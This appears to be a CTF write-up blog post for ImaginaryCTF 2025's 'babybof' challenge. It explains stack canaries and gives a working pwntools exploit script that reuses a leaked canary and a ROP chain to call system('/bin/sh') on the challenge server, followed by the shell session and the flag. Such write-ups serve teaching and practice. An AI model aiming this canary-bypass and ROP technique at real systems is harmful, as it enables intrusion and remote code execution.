---
layout: post
title:  "babybof"
date:   2025-09-08 21:20:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /imaginaryctf-2025-babybof/
---

**Title:** babybof

**Category:** pwn  

**Creator:** Eth007

**Description:** welcome to pwn! hopefully you can do your first buffer overflow

`nc babybof.chal.imaginaryctf.org 1337`

I get a binary for local testing. I run it:
```shell
file vuln1 
vuln1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ba6fa8651d912a4066553867627aee0cc13cd1b  
, for GNU/Linux 3.2.0, not stripped

./vuln  
Welcome to babybof!  
Here is some helpful info:  
system @ 0x7fed21296490  
pop rdi; ret @ 0x4011ba  
ret @ 0x4011bb  
"/bin/sh" @ 0x404038  
canary: 0xa3ec26e913c31700  
enter your input (make sure your stack is aligned!): gimme flag     
your input: gimme flag  
canary: 0xa3ec26e913c31700  
return address: 0x7fed2127124a
```
I see the same output when connecting remotely. All the info I need is right here. I locally test the buffer. 56 characters is the limit.

The canary is a security mechanism placed between the buffer and the saved return address on the stack. It attempts to detect and prevent buffer overflow attacks that try to overwrite the return address. 

If a buffer overflow occurs and overwrites memory past the buffer, the canary is overwritten. Before the function returns, the program checks whether the canary has changed. If it changes, the program exits, preventing the attacker from hijacking control flow. 

Knowing the canary allows you to overflow the buffer without triggering the canary check, letting the ROP chain execute.

Run this script:
```python
from pwn import *

HOST, PORT = "babybof.chal.imaginaryctf.org", 1337
USE_REMOTE = True

POP_RDI = 0x4011ba
RET     = 0x4011bb
BUF     = 56

io = remote(HOST, PORT) if USE_REMOTE else process("./vuln")
banner = io.recvuntil(b"input").decode()

def grab(tag): return int(banner.split(tag+" @ ")[1].split()[0],16)

system = grab("system")
binsh  = grab('"/bin/sh"')
canary = int(banner.split("canary: ")[1].split()[0],16)

payload  = b"A"*BUF
payload += p64(canary)
payload += b"B"*8
payload += p64(RET)
payload += p64(POP_RDI) + p64(binsh)
payload += p64(system)

io.sendline(payload)
io.interactive()
```
The script sends a string that fills the buffer up to the canary, copies the canary, and overwrites the saved return address with a ROP chain `ret > pop rdi > /bin/sh > system`. 

Getting the flag:
```shell
python3 overflow.py  
[+] Opening connection to babybof.chal.imaginaryctf.org on port 1337: Done  
[*] Switching to interactive mode  
(make sure your stack is aligned!): your input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
canary: 0x857fc228c5f96b00  
return address: 0x4011bb  
$ id  
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)  
$ ls  
chal  
flag.txt  
$ cat flag.txt  
ictf{arent_challenges_written_two_hours_before_ctf_amazing}  
$    
[*] Interrupted  
[*] Closed connection to babybof.chal.imaginaryctf.org port 1337
```
`ictf{arent_challenges_written_two_hours_before_ctf_amazing}`